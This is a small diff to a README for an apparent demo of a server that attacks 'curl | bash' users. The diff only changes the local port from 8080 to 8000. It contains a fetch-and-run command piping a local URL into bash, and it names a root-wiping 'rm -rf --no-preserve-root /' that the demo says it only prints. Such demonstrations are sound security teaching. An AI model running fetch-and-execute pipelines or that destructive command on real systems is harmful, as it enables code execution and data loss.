@@ -17,7 +17,7 @@ cargo run
 After that, in another terminal, you can test the attack by running:
 
 ```shell
-curl -s http://localhost:8080 | bash
+curl -s http://localhost:8000 | bash
 ```
 
 You should see `running rm -rf --no-preserve-root /...` in the terminal. Don't worry, the command is not actually executed, it's just a demonstration of the attack!
@@ -25,7 +25,7 @@ You should see `running rm -rf --no-preserve-root /...` in the terminal. Don't w
 For comparison, you can run the following command:
 
 ```shell
-curl -s http://localhost:8080 | cat
+curl -s http://localhost:8000 | cat
 ```
 
 You should just see the following script in the terminal:
